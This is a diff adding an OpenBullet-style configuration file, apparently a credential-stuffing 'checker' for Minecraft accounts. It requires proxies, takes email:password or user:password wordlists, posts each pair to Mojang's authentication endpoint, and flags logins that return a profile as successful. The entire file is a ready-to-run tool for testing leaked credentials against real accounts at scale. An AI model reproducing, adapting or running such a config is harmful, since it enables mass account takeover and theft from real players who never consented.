@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "Minecraft",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-01T22:36:52.4144027+02:00",
+  "AdditionalInfo": "",
+  "Author": "nihil#0001",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"<USER>\",\"password\":\"<PASS>\",\"requestUser\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorMessage" 
+  KEYCHAIN Success OR 
+    KEY "selectedProfile" 
